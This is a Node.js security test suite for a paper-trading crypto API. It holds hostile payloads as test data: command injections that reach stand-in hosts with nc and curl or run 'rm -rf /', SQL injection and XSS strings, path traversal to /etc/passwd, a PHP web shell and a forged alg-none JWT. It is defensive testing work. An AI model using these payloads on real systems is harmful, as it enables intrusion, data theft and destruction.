#!/usr/bin/env node

/**
 * Comprehensive Security Audit and Penetration Testing Suite
 * Task 26: Execute Security Testing and Validation
 * 
 * This script performs:
 * - Comprehensive security audit and penetration testing
 * - Paper trading safety mechanism validation under attack scenarios
 * - API security, authentication, and authorization testing
 * - Security vulnerability assessment and remediation recommendations
 */

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { performance } = require('perf_hooks');

class ComprehensiveSecurityAudit {
  constructor() {
    this.results = {
      summary: {
        totalTests: 0,
        passedTests: 0,
        failedTests: 0,
        criticalVulnerabilities: 0,
        highRiskVulnerabilities: 0,
        mediumRiskVulnerabilities: 0,
        lowRiskVulnerabilities: 0
      },
      testResults: [],
      vulnerabilities: [],
      recommendations: [],
      paperTradingSafetyResults: {},
      apiSecurityResults: {},
      authenticationResults: {},
      penetrationTestResults: {}
    };
    
    this.baseUrl = process.env.BASE_URL || 'http://localhost:3001';
    this.apiPort = process.env.API_PORT || 3001;
    this.authToken = null;
    
    this.startTime = Date.now();
  }

  log(level, message, details = null) {
    const timestamp = new Date().toISOString();
    const logEntry = { timestamp, level, message, details };
    
    console.log(`[${timestamp}] ${level.toUpperCase()}: ${message}`);
    if (details) {
      console.log(`  Details: ${JSON.stringify(details, null, 2)}`);
    }
  }

  async runSecurityAudit() {
    this.log('info', '🔐 Starting Comprehensive Security Audit');
    this.log('info', '==========================================');
    
    try {
      // Phase 1: Authentication and Setup
      await this.setupAuthentication();
      
      // Phase 2: Paper Trading Safety Under Attack
      await this.testPaperTradingSafetyUnderAttack();
      
      // Phase 3: API Security Testing
      await this.testAPISecurityComprehensive();      
  
    // Phase 4: Authentication and Authorization Testing
      await this.testAuthenticationSecurity();
      
      // Phase 5: Penetration Testing
      await this.runPenetrationTests();
      
      // Phase 6: Infrastructure Security
      await this.testInfrastructureSecurity();
      
      // Phase 7: Business Logic Security
      await this.testBusinessLogicSecurity();
      
      // Phase 8: Generate Security Report
      await this.generateSecurityReport();
      
      this.log('info', '✅ Security audit completed successfully');
      
    } catch (error) {
      this.log('error', 'Security audit failed', error.message);
      throw error;
    }
  }

  async setupAuthentication() {
    this.log('info', '🔑 Setting up authentication for security tests');
    
    try {
      // Create test user for security testing
      const testUser = {
        email: 'security-test@example.com',
        password: 'SecureTestPass123!'
      };
      
      // Attempt login to get auth token
      const loginResponse = await this.makeRequest('/api/auth/login', {
        method: 'POST',
        body: JSON.stringify(testUser),
        headers: { 'Content-Type': 'application/json' }
      });
      
      if (loginResponse.ok) {
        const loginData = await loginResponse.json();
        this.authToken = loginData.token;
        this.log('info', '✅ Authentication setup successful');
      } else {
        this.log('warning', 'Could not authenticate - some tests may be limited');
      }
      
    } catch (error) {
      this.log('warning', 'Authentication setup failed', error.message);
    }
  }

  async testPaperTradingSafetyUnderAttack() {
    this.log('info', '🛡️ Testing Paper Trading Safety Under Attack Scenarios');
    
    const attackScenarios = [
      {
        name: 'Environment Variable Manipulation Attack',
        test: () => this.testEnvironmentVariableAttack()
      },
      {
        name: 'Real Trading API Bypass Attempt',
        test: () => this.testRealTradingBypassAttempt()
      },
      {
        name: 'Paper Trading Guard Circumvention',
        test: () => this.testPaperTradingGuardCircumvention()
      },
      {
        name: 'Virtual Balance Manipulation Attack',
        test: () => this.testVirtualBalanceManipulation()
      },
      {
        name: 'API Key Permission Escalation',
        test: () => this.testAPIKeyPermissionEscalation()
      },
      {
        name: 'Trading Simulation Engine Bypass',
        test: () => this.testTradingSimulationBypass()
      }
    ];
    
    for (const scenario of attackScenarios) {
      try {
        this.log('info', `Testing: ${scenario.name}`);
        const result = await scenario.test();
        this.recordTestResult(scenario.name, result.passed, result.details, result.riskLevel);
      } catch (error) {
        this.recordTestResult(scenario.name, false, error.message, 'critical');
      }
    }
  }

  async testEnvironmentVariableAttack() {
    // Test attempts to manipulate environment variables that control paper trading
    const attacks = [
      { var: 'TRADING_SIMULATION_ONLY', value: 'false' },
      { var: 'PAPER_TRADING_MODE', value: 'false' },
      { var: 'ALLOW_REAL_TRADES', value: 'true' },
      { var: 'NODE_ENV', value: 'production' }
    ];
    
    let vulnerabilities = [];
    
    for (const attack of attacks) {
      // Test if environment variable manipulation is possible
      const response = await this.makeRequest('/api/test/env-override', {
        method: 'POST',
        headers: this.getAuthHeaders(),
        body: JSON.stringify({ [attack.var]: attack.value })
      });
      
      if (response && response.ok) {
        vulnerabilities.push(`Environment variable ${attack.var} can be manipulated`);
      }
    }
    
    return {
      passed: vulnerabilities.length === 0,
      details: vulnerabilities.length > 0 ? vulnerabilities : 'Environment variables properly protected',
      riskLevel: vulnerabilities.length > 0 ? 'critical' : 'low'
    };
  }

  async testRealTradingBypassAttempt() {
    // Test attempts to bypass paper trading restrictions
    const bypassAttempts = [
      {
        endpoint: '/api/trading/execute',
        payload: { symbol: 'BTCUSDT', side: 'buy', amount: 0.001, force_real: true }
      },
      {
        endpoint: '/api/trading/execute',
        payload: { symbol: 'BTCUSDT', side: 'buy', amount: 0.001, paper_trading: false }
      },
      {
        endpoint: '/api/trading/real-execute',
        payload: { symbol: 'BTCUSDT', side: 'buy', amount: 0.001 }
      },
      {
        endpoint: '/api/trading/execute',
        payload: { symbol: 'BTCUSDT', side: 'buy', amount: 0.001, bypass_safety: true }
      }
    ];
    
    let bypassSuccessful = false;
    let vulnerabilities = [];
    
    for (const attempt of bypassAttempts) {
      const response = await this.makeRequest(attempt.endpoint, {
        method: 'POST',
        headers: this.getAuthHeaders(),
        body: JSON.stringify(attempt.payload)
      });
      
      if (response && response.ok) {
        const data = await response.json();
        if (data.real_trade || data.executed_on_exchange) {
          bypassSuccessful = true;
          vulnerabilities.push(`Real trading bypass successful via ${attempt.endpoint}`);
        }
      }
    }
    
    return {
      passed: !bypassSuccessful,
      details: bypassSuccessful ? vulnerabilities : 'All real trading bypass attempts blocked',
      riskLevel: bypassSuccessful ? 'critical' : 'low'
    };
  }

  async testPaperTradingGuardCircumvention() {
    // Test attempts to circumvent paper trading guard middleware
    const circumventionAttempts = [
      {
        name: 'Header manipulation',
        headers: { 'X-Paper-Trading': 'false', 'X-Real-Trading': 'true' }
      },
      {
        name: 'User agent spoofing',
        headers: { 'User-Agent': 'TradingBot-Production-v1.0' }
      },
      {
        name: 'Origin spoofing',
        headers: { 'Origin': 'https://production-trading.com' }
      },
      {
        name: 'Referer manipulation',
        headers: { 'Referer': 'https://real-trading-interface.com' }
      }
    ];
    
    let circumventionSuccessful = false;
    let vulnerabilities = [];
    
    for (const attempt of circumventionAttempts) {
      const response = await this.makeRequest('/api/trading/execute', {
        method: 'POST',
        headers: { ...this.getAuthHeaders(), ...attempt.headers },
        body: JSON.stringify({ symbol: 'BTCUSDT', side: 'buy', amount: 0.001 })
      });
      
      if (response && response.ok) {
        const data = await response.json();
        if (!data.paper_trade && !data.simulated) {
          circumventionSuccessful = true;
          vulnerabilities.push(`Paper trading guard circumvented via ${attempt.name}`);
        }
      }
    }
    
    return {
      passed: !circumventionSuccessful,
      details: circumventionSuccessful ? vulnerabilities : 'Paper trading guard cannot be circumvented',
      riskLevel: circumventionSuccessful ? 'critical' : 'low'
    };
  }

  async testVirtualBalanceManipulation() {
    // Test attempts to manipulate virtual balances
    const manipulationAttempts = [
      { balance: 999999999, currency: 'USDT' },
      { balance: -1000, currency: 'BTC' },
      { balance: Infinity, currency: 'ETH' },
      { balance: 'unlimited', currency: 'USDT' }
    ];
    
    let manipulationSuccessful = false;
    let vulnerabilities = [];
    
    for (const attempt of manipulationAttempts) {
      const response = await this.makeRequest('/api/account/set-balance', {
        method: 'POST',
        headers: this.getAuthHeaders(),
        body: JSON.stringify(attempt)
      });
      
      if (response && response.ok) {
        manipulationSuccessful = true;
        vulnerabilities.push(`Virtual balance manipulation successful: ${JSON.stringify(attempt)}`);
      }
    }
    
    return {
      passed: !manipulationSuccessful,
      details: manipulationSuccessful ? vulnerabilities : 'Virtual balance manipulation blocked',
      riskLevel: manipulationSuccessful ? 'high' : 'low'
    };
  }

  async testAPIKeyPermissionEscalation() {
    // Test attempts to escalate API key permissions
    const escalationAttempts = [
      {
        endpoint: '/api/keys/upgrade-permissions',
        payload: { permissions: ['trade', 'withdraw'] }
      },
      {
        endpoint: '/api/keys/modify',
        payload: { trading_enabled: true }
      },
      {
        endpoint: '/api/admin/keys/override',
        payload: { force_trading: true }
      }
    ];
    
    let escalationSuccessful = false;
    let vulnerabilities = [];
    
    for (const attempt of escalationAttempts) {
      const response = await this.makeRequest(attempt.endpoint, {
        method: 'POST',
        headers: this.getAuthHeaders(),
        body: JSON.stringify(attempt.payload)
      });
      
      if (response && response.ok) {
        escalationSuccessful = true;
        vulnerabilities.push(`API key permission escalation via ${attempt.endpoint}`);
      }
    }
    
    return {
      passed: !escalationSuccessful,
      details: escalationSuccessful ? vulnerabilities : 'API key permission escalation blocked',
      riskLevel: escalationSuccessful ? 'critical' : 'low'
    };
  }

  async testTradingSimulationBypass() {
    // Test attempts to bypass trading simulation engine
    const bypassAttempts = [
      {
        name: 'Direct exchange API call',
        endpoint: '/api/exchange/binance/order',
        payload: { symbol: 'BTCUSDT', side: 'buy', quantity: 0.001 }
      },
      {
        name: 'Simulation engine override',
        endpoint: '/api/trading/execute',
        payload: { symbol: 'BTCUSDT', side: 'buy', amount: 0.001, use_simulation: false }
      },
      {
        name: 'Raw trading endpoint',
        endpoint: '/api/raw/trade',
        payload: { symbol: 'BTCUSDT', side: 'buy', amount: 0.001 }
      }
    ];
    
    let bypassSuccessful = false;
    let vulnerabilities = [];
    
    for (const attempt of bypassAttempts) {
      const response = await this.makeRequest(attempt.endpoint, {
        method: 'POST',
        headers: this.getAuthHeaders(),
        body: JSON.stringify(attempt.payload)
      });
      
      if (response && response.ok) {
        const data = await response.json();
        if (data.exchange_order_id || data.real_execution) {
          bypassSuccessful = true;
          vulnerabilities.push(`Trading simulation bypassed via ${attempt.name}`);
        }
      }
    }
    
    return {
      passed: !bypassSuccessful,
      details: bypassSuccessful ? vulnerabilities : 'Trading simulation cannot be bypassed',
      riskLevel: bypassSuccessful ? 'critical' : 'low'
    };
  }

  async testAPISecurityComprehensive() {
    this.log('info', '🔒 Testing API Security Comprehensively');
    
    const apiTests = [
      { name: 'SQL Injection Prevention', test: () => this.testSQLInjectionPrevention() },
      { name: 'XSS Prevention', test: () => this.testXSSPrevention() },
      { name: 'Command Injection Prevention', test: () => this.testCommandInjectionPrevention() },
      { name: 'Path Traversal Prevention', test: () => this.testPathTraversalPrevention() },
      { name: 'Input Validation', test: () => this.testInputValidation() },
      { name: 'Rate Limiting', test: () => this.testRateLimiting() },
      { name: 'CORS Security', test: () => this.testCORSSecurity() },
      { name: 'Security Headers', test: () => this.testSecurityHeaders() }
    ];
    
    for (const apiTest of apiTests) {
      try {
        this.log('info', `Testing: ${apiTest.name}`);
        const result = await apiTest.test();
        this.recordTestResult(apiTest.name, result.passed, result.details, result.riskLevel);
      } catch (error) {
        this.recordTestResult(apiTest.name, false, error.message, 'high');
      }
    }
  }

  async testSQLInjectionPrevention() {
    const sqlPayloads = [
      "'; DROP TABLE users; --",
      "1' OR '1'='1",
      "admin'/**/OR/**/1=1#",
      "' UNION SELECT password FROM users WHERE '1'='1",
      "1'; INSERT INTO users (email, password) VALUES ('hacker@evil.com', 'hacked'); --"
    ];
    
    let vulnerabilities = [];
    
    for (const payload of sqlPayloads) {
      // Test various endpoints with SQL injection payloads
      const endpoints = [
        { path: '/api/market-data/ticker', param: 'symbol', value: payload },
        { path: '/api/trading/history', param: 'search', value: payload },
        { path: '/api/user/profile', param: 'id', value: payload }
      ];
      
      for (const endpoint of endpoints) {
        const response = await this.makeRequest(`${endpoint.path}?${endpoint.param}=${encodeURIComponent(endpoint.value)}`, {
          headers: this.getAuthHeaders()
        });
        
        if (response && response.ok) {
          const text = await response.text();
          if (text.includes('syntax error') || text.includes('mysql') || text.includes('postgresql')) {
            vulnerabilities.push(`SQL injection possible at ${endpoint.path} via ${endpoint.param}`);
          }
        }
      }
    }
    
    return {
      passed: vulnerabilities.length === 0,
      details: vulnerabilities.length > 0 ? vulnerabilities : 'SQL injection prevention working',
      riskLevel: vulnerabilities.length > 0 ? 'critical' : 'low'
    };
  }

  async testXSSPrevention() {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(1)">',
      'javascript:alert("XSS")',
      '<svg/onload=alert(1)>',
      '<iframe src="javascript:alert(1)"></iframe>'
    ];
    
    let vulnerabilities = [];
    
    for (const payload of xssPayloads) {
      const response = await this.makeRequest('/api/user/profile', {
        method: 'POST',
        headers: this.getAuthHeaders(),
        body: JSON.stringify({ displayName: payload, bio: payload })
      });
      
      if (response && response.ok) {
        const data = await response.json();
        if (data.displayName && data.displayName.includes('<script>')) {
          vulnerabilities.push(`XSS vulnerability in profile update`);
        }
      }
    }
    
    return {
      passed: vulnerabilities.length === 0,
      details: vulnerabilities.length > 0 ? vulnerabilities : 'XSS prevention working',
      riskLevel: vulnerabilities.length > 0 ? 'high' : 'low'
    };
  }

  async testCommandInjectionPrevention() {
    const commandPayloads = [
      '; cat /etc/passwd',
      '&& rm -rf /',
      '| nc attacker.com 4444',
      '`whoami`',
      '$(id)',
      '; curl http://evil.com/steal'
    ];
    
    let vulnerabilities = [];
    
    for (const payload of commandPayloads) {
      const response = await this.makeRequest('/api/config/strategy', {
        method: 'POST',
        headers: this.getAuthHeaders(),
        body: JSON.stringify({ name: `strategy${payload}`, command: payload })
      });
      
      if (response && response.ok) {
        const text = await response.text();
        if (text.includes('root:') || text.includes('uid=') || text.includes('gid=')) {
          vulnerabilities.push(`Command injection possible in strategy config`);
        }
      }
    }
    
    return {
      passed: vulnerabilities.length === 0,
      details: vulnerabilities.length > 0 ? vulnerabilities : 'Command injection prevention working',
      riskLevel: vulnerabilities.length > 0 ? 'critical' : 'low'
    };
  }

  async testPathTraversalPrevention() {
    const pathPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '....//....//....//etc/passwd'
    ];
    
    let vulnerabilities = [];
    
    for (const payload of pathPayloads) {
      const response = await this.makeRequest(`/api/files/${encodeURIComponent(payload)}`, {
        headers: this.getAuthHeaders()
      });
      
      if (response && response.ok) {
        const text = await response.text();
        if (text.includes('root:') || text.includes('[users]')) {
          vulnerabilities.push(`Path traversal possible in file access`);
        }
      }
    }
    
    return {
      passed: vulnerabilities.length === 0,
      details: vulnerabilities.length > 0 ? vulnerabilities : 'Path traversal prevention working',
      riskLevel: vulnerabilities.length > 0 ? 'high' : 'low'
    };
  }

  async testInputValidation() {
    const invalidInputs = [
      { type: 'oversized', value: 'A'.repeat(10000) },
      { type: 'null_bytes', value: 'test\x00admin' },
      { type: 'unicode_bypass', value: 'admin\u202etest' },
      { type: 'negative_numbers', value: -999999 },
      { type: 'infinity', value: Infinity },
      { type: 'nan', value: NaN }
    ];
    
    let vulnerabilities = [];
    
    for (const input of invalidInputs) {
      const response = await this.makeRequest('/api/trading/execute', {
        method: 'POST',
        headers: this.getAuthHeaders(),
        body: JSON.stringify({ symbol: input.value, side: 'buy', amount: input.value })
      });
      
      if (response && response.ok) {
        vulnerabilities.push(`Invalid input accepted: ${input.type}`);
      }
    }
    
    return {
      passed: vulnerabilities.length === 0,
      details: vulnerabilities.length > 0 ? vulnerabilities : 'Input validation working properly',
      riskLevel: vulnerabilities.length > 0 ? 'medium' : 'low'
    };
  }

  async testRateLimiting() {
    const startTime = Date.now();
    const requests = [];
    
    // Send 50 rapid requests
    for (let i = 0; i < 50; i++) {
      requests.push(
        this.makeRequest('/api/auth/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email: 'test@example.com', password: 'wrong' })
        })
      );
    }
    
    const responses = await Promise.all(requests);
    const rateLimitedCount = responses.filter(r => r && r.status === 429).length;
    
    return {
      passed: rateLimitedCount > 0,
      details: `${rateLimitedCount} requests were rate limited out of 50`,
      riskLevel: rateLimitedCount === 0 ? 'high' : 'low'
    };
  }

  async testCORSSecurity() {
    const maliciousOrigins = [
      'https://evil.com',
      'http://malicious-site.com',
      'https://phishing-site.com'
    ];
    
    let vulnerabilities = [];
    
    for (const origin of maliciousOrigins) {
      const response = await this.makeRequest('/api/health', {
        headers: { 'Origin': origin }
      });
      
      if (response && response.headers.get('Access-Control-Allow-Origin') === origin) {
        vulnerabilities.push(`CORS allows malicious origin: ${origin}`);
      }
    }
    
    return {
      passed: vulnerabilities.length === 0,
      details: vulnerabilities.length > 0 ? vulnerabilities : 'CORS properly configured',
      riskLevel: vulnerabilities.length > 0 ? 'medium' : 'low'
    };
  }

  async testSecurityHeaders() {
    const response = await this.makeRequest('/api/health');
    const headers = {};
    
    if (response) {
      response.headers.forEach((value, key) => {
        headers[key.toLowerCase()] = value;
      });
    }
    
    const requiredHeaders = {
      'x-frame-options': 'DENY',
      'x-content-type-options': 'nosniff',
      'x-xss-protection': '1; mode=block',
      'strict-transport-security': 'max-age='
    };
    
    let missingHeaders = [];
    
    for (const [header, expectedValue] of Object.entries(requiredHeaders)) {
      if (!headers[header]) {
        missingHeaders.push(`Missing ${header} header`);
      } else if (expectedValue !== 'max-age=' && !headers[header].includes(expectedValue)) {
        missingHeaders.push(`Incorrect ${header} header value`);
      }
    }
    
    // Check for information disclosure
    if (headers['server'] && headers['server'].includes('Express')) {
      missingHeaders.push('Server header exposes technology stack');
    }
    
    if (headers['x-powered-by']) {
      missingHeaders.push('X-Powered-By header exposes technology');
    }
    
    return {
      passed: missingHeaders.length === 0,
      details: missingHeaders.length > 0 ? missingHeaders : 'All security headers properly configured',
      riskLevel: missingHeaders.length > 0 ? 'medium' : 'low'
    };
  }

  async testAuthenticationSecurity() {
    this.log('info', '🔐 Testing Authentication and Authorization Security');
    
    const authTests = [
      { name: 'JWT Token Security', test: () => this.testJWTSecurity() },
      { name: 'Password Policy Enforcement', test: () => this.testPasswordPolicy() },
      { name: 'Session Management', test: () => this.testSessionManagement() },
      { name: 'Authorization Bypass Prevention', test: () => this.testAuthorizationBypass() },
      { name: 'Account Lockout Mechanism', test: () => this.testAccountLockout() }
    ];
    
    for (const authTest of authTests) {
      try {
        this.log('info', `Testing: ${authTest.name}`);
        const result = await authTest.test();
        this.recordTestResult(authTest.name, result.passed, result.details, result.riskLevel);
      } catch (error) {
        this.recordTestResult(authTest.name, false, error.message, 'high');
      }
    }
  }

  async testJWTSecurity() {
    const weakTokens = [
      'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.',
      'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9.invalid',
      'invalid.token.here',
      'Bearer null',
      'Bearer undefined'
    ];
    
    let vulnerabilities = [];
    
    for (const token of weakTokens) {
      const response = await this.makeRequest('/api/user/profile', {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      
      if (response && response.ok) {
        vulnerabilities.push(`Weak JWT token accepted: ${token.substring(0, 20)}...`);
      }
    }
    
    return {
      passed: vulnerabilities.length === 0,
      details: vulnerabilities.length > 0 ? vulnerabilities : 'JWT security properly implemented',
      riskLevel: vulnerabilities.length > 0 ? 'critical' : 'low'
    };
  }

  async testPasswordPolicy() {
    const weakPasswords = [
      '123456',
      'password',
      'admin',
      'test',
      '12345678',
      'qwerty'
    ];
    
    let vulnerabilities = [];
    
    for (const password of weakPasswords) {
      const response = await this.makeRequest('/api/auth/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: `test${Date.now()}@example.com`,
          password
        })
      });
      
      if (response && response.ok) {
        vulnerabilities.push(`Weak password accepted: ${password}`);
      }
    }
    
    return {
      passed: vulnerabilities.length === 0,
      details: vulnerabilities.length > 0 ? vulnerabilities : 'Password policy properly enforced',
      riskLevel: vulnerabilities.length > 0 ? 'high' : 'low'
    };
  }

  async testSessionManagement() {
    // Test session invalidation on logout
    let vulnerabilities = [];
    
    try {
      // Login to get a token
      const loginResponse = await this.makeRequest('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: 'security-test@example.com',
          password: 'SecureTestPass123!'
        })
      });
      
      if (loginResponse && loginResponse.ok) {
        const loginData = await loginResponse.json();
        const token = loginData.token;
        
        // Logout
        await this.makeRequest('/api/auth/logout', {
          method: 'POST',
          headers: { 'Authorization': `Bearer ${token}` }
        });
        
        // Try to use token after logout
        const testResponse = await this.makeRequest('/api/user/profile', {
          headers: { 'Authorization': `Bearer ${token}` }
        });
        
        if (testResponse && testResponse.ok) {
          vulnerabilities.push('Session not invalidated on logout');
        }
      }
    } catch (error) {
      // Expected behavior
    }
    
    return {
      passed: vulnerabilities.length === 0,
      details: vulnerabilities.length > 0 ? vulnerabilities : 'Session management working properly',
      riskLevel: vulnerabilities.length > 0 ? 'medium' : 'low'
    };
  }

  async testAuthorizationBypass() {
    const bypassAttempts = [
      { endpoint: '/api/admin/users', method: 'GET' },
      { endpoint: '/api/admin/system', method: 'GET' },
      { endpoint: '/api/admin/logs', method: 'GET' },
      { endpoint: '/api/user/profile/other-user-id', method: 'GET' }
    ];
    
    let vulnerabilities = [];
    
    for (const attempt of bypassAttempts) {
      const response = await this.makeRequest(attempt.endpoint, {
        method: attempt.method,
        headers: this.getAuthHeaders()
      });
      
      if (response && response.ok) {
        vulnerabilities.push(`Authorization bypass possible at ${attempt.endpoint}`);
      }
    }
    
    return {
      passed: vulnerabilities.length === 0,
      details: vulnerabilities.length > 0 ? vulnerabilities : 'Authorization properly enforced',
      riskLevel: vulnerabilities.length > 0 ? 'high' : 'low'
    };
  }

  async testAccountLockout() {
    // Test account lockout after multiple failed attempts
    const testEmail = 'lockout-test@example.com';
    let lockoutTriggered = false;
    
    // Attempt multiple failed logins
    for (let i = 0; i < 10; i++) {
      const response = await this.makeRequest('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: testEmail,
          password: 'wrongpassword'
        })
      });
      
      if (response && response.status === 423) { // Account locked
        lockoutTriggered = true;
        break;
      }
    }
    
    return {
      passed: lockoutTriggered,
      details: lockoutTriggered ? 'Account lockout mechanism working' : 'Account lockout not triggered',
      riskLevel: !lockoutTriggered ? 'medium' : 'low'
    };
  }

  async runPenetrationTests() {
    this.log('info', '🎯 Running Penetration Tests');
    
    const penTests = [
      { name: 'Brute Force Attack Simulation', test: () => this.testBruteForceAttack() },
      { name: 'Directory Traversal Attack', test: () => this.testDirectoryTraversal() },
      { name: 'File Upload Attack', test: () => this.testFileUploadAttack() },
      { name: 'Business Logic Manipulation', test: () => this.testBusinessLogicManipulation() },
      { name: 'Cryptographic Weakness', test: () => this.testCryptographicWeakness() }
    ];
    
    for (const penTest of penTests) {
      try {
        this.log('info', `Running: ${penTest.name}`);
        const result = await penTest.test();
        this.recordTestResult(penTest.name, result.passed, result.details, result.riskLevel);
      } catch (error) {
        this.recordTestResult(penTest.name, false, error.message, 'high');
      }
    }
  }

  async testBruteForceAttack() {
    const startTime = Date.now();
    const attempts = [];
    
    // Simulate brute force attack
    for (let i = 0; i < 100; i++) {
      attempts.push(
        this.makeRequest('/api/auth/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email: 'admin@example.com',
            password: `password${i}`
          })
        })
      );
    }
    
    const responses = await Promise.all(attempts);
    const blockedCount = responses.filter(r => r && (r.status === 429 || r.status === 423)).length;
    const duration = Date.now() - startTime;
    
    return {
      passed: blockedCount > 50, // At least half should be blocked
      details: `${blockedCount} out of 100 attempts blocked in ${duration}ms`,
      riskLevel: blockedCount < 50 ? 'high' : 'low'
    };
  }

  async testDirectoryTraversal() {
    const traversalPaths = [
      '/api/files/../../../etc/passwd',
      '/api/files/..\\..\\..\\windows\\system32\\config\\sam',
      '/api/files/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
    ];
    
    let vulnerabilities = [];
    
    for (const path of traversalPaths) {
      const response = await this.makeRequest(path, {
        headers: this.getAuthHeaders()
      });
      
      if (response && response.ok) {
        const text = await response.text();
        if (text.includes('root:') || text.includes('[users]')) {
          vulnerabilities.push(`Directory traversal successful: ${path}`);
        }
      }
    }
    
    return {
      passed: vulnerabilities.length === 0,
      details: vulnerabilities.length > 0 ? vulnerabilities : 'Directory traversal blocked',
      riskLevel: vulnerabilities.length > 0 ? 'critical' : 'low'
    };
  }

  async testFileUploadAttack() {
    const maliciousFiles = [
      { name: 'malware.exe', content: 'MZ\x90\x00', type: 'application/octet-stream' },
      { name: 'shell.php', content: '<?php system($_GET["cmd"]); ?>', type: 'text/plain' },
      { name: 'backdoor.jsp', content: '<%@ page import="java.io.*" %>', type: 'text/plain' }
    ];
    
    let vulnerabilities = [];
    
    for (const file of maliciousFiles) {
      // Create form data
      const formData = new FormData();
      formData.append('file', new Blob([file.content], { type: file.type }), file.name);
      
      try {
        const response = await fetch(`${this.baseUrl}/api/files/upload`, {
          method: 'POST',
          headers: this.getAuthHeaders(),
          body: formData
        });
        
        if (response.ok) {
          vulnerabilities.push(`Malicious file upload accepted: ${file.name}`);
        }
      } catch (error) {
        // Expected for malicious files
      }
    }
    
    return {
      passed: vulnerabilities.length === 0,
      details: vulnerabilities.length > 0 ? vulnerabilities : 'File upload security working',
      riskLevel: vulnerabilities.length > 0 ? 'high' : 'low'
    };
  }

  async testBusinessLogicManipulation() {
    const manipulationTests = [
      {
        name: 'Price manipulation',
        endpoint: '/api/market-data/inject',
        payload: { symbol: 'BTCUSDT', price: -1000 }
      },
      {
        name: 'Order size overflow',
        endpoint: '/api/trading/execute',
        payload: { symbol: 'BTCUSDT', side: 'buy', size: Number.MAX_SAFE_INTEGER }
      },
      {
        name: 'Negative balance injection',
        endpoint: '/api/account/set-balance',
        payload: { balance: -1000000, currency: 'USDT' }
      }
    ];
    
    let vulnerabilities = [];
    
    for (const test of manipulationTests) {
      const response = await this.makeRequest(test.endpoint, {
        method: 'POST',
        headers: this.getAuthHeaders(),
        body: JSON.stringify(test.payload)
      });
      
      if (response && response.ok) {
        vulnerabilities.push(`Business logic manipulation successful: ${test.name}`);
      }
    }
    
    return {
      passed: vulnerabilities.length === 0,
      details: vulnerabilities.length > 0 ? vulnerabilities : 'Business logic properly protected',
      riskLevel: vulnerabilities.length > 0 ? 'critical' : 'low'
    };
  }

  async testCryptographicWeakness() {
    let vulnerabilities = [];
    
    // Test for weak encryption
    const response = await this.makeRequest('/api/test/crypto-info', {
      headers: this.getAuthHeaders()
    });
    
    if (response && response.ok) {
      const data = await response.json();
      
      if (data.encryption_algorithm && data.encryption_algorithm.includes('DES')) {
        vulnerabilities.push('Weak encryption algorithm detected: DES');
      }
      
      if (data.hash_algorithm && data.hash_algorithm.includes('MD5')) {
        vulnerabilities.push('Weak hash algorithm detected: MD5');
      }
      
      if (data.key_length && data.key_length < 256) {
        vulnerabilities.push(`Weak key length detected: ${data.key_length} bits`);
      }
    }
    
    return {
      passed: vulnerabilities.length === 0,
      details: vulnerabilities.length > 0 ? vulnerabilities : 'Cryptographic implementation secure',
      riskLevel: vulnerabilities.length > 0 ? 'high' : 'low'
    };
  }

  async testInfrastructureSecurity() {
    this.log('info', '🏗️ Testing Infrastructure Security');
    
    const infraTests = [
      { name: 'SSL/TLS Configuration', test: () => this.testSSLConfiguration() },
      { name: 'Server Information Disclosure', test: () => this.testServerInfoDisclosure() },
      { name: 'Error Handling Security', test: () => this.testErrorHandling() },
      { name: 'Logging Security', test: () => this.testLoggingSecurity() }
    ];
    
    for (const infraTest of infraTests) {
      try {
        this.log('info', `Testing: ${infraTest.name}`);
        const result = await infraTest.test();
        this.recordTestResult(infraTest.name, result.passed, result.details, result.riskLevel);
      } catch (error) {
        this.recordTestResult(infraTest.name, false, error.message, 'medium');
      }
    }
  }

  async testSSLConfiguration() {
    let vulnerabilities = [];
    
    try {
      const httpsUrl = this.baseUrl.replace('http://', 'https://');
      const response = await fetch(httpsUrl);
      
      if (!response.ok) {
        vulnerabilities.push('HTTPS not properly configured');
      }
      
      const headers = {};
      response.headers.forEach((value, key) => {
        headers[key.toLowerCase()] = value;
      });
      
      if (!headers['strict-transport-security']) {
        vulnerabilities.push('HSTS header missing');
      }
      
    } catch (error) {
      vulnerabilities.push('SSL/TLS connection failed');
    }
    
    return {
      passed: vulnerabilities.length === 0,
      details: vulnerabilities.length > 0 ? vulnerabilities : 'SSL/TLS properly configured',
      riskLevel: vulnerabilities.length > 0 ? 'high' : 'low'
    };
  }

  async testServerInfoDisclosure() {
    const response = await this.makeRequest('/api/health');
    let vulnerabilities = [];
    
    if (response) {
      const headers = {};
      response.headers.forEach((value, key) => {
        headers[key.toLowerCase()] = value;
      });
      
      if (headers['server']) {
        vulnerabilities.push(`Server header exposes information: ${headers['server']}`);
      }
      
      if (headers['x-powered-by']) {
        vulnerabilities.push(`X-Powered-By header exposes technology: ${headers['x-powered-by']}`);
      }
    }
    
    return {
      passed: vulnerabilities.length === 0,
      details: vulnerabilities.length > 0 ? vulnerabilities : 'No server information disclosed',
      riskLevel: vulnerabilities.length > 0 ? 'low' : 'low'
    };
  }

  async testErrorHandling() {
    const errorTriggers = [
      '/api/nonexistent-endpoint',
      '/api/trading/execute',  // Without auth
      '/api/user/profile/invalid-id'
    ];
    
    let vulnerabilities = [];
    
    for (const endpoint of errorTriggers) {
      const response = await this.makeRequest(endpoint);
      
      if (response) {
        const text = await response.text();
        
        if (text.includes('Error:') && text.includes('at ')) {
          vulnerabilities.push(`Stack trace exposed at ${endpoint}`);
        }
        
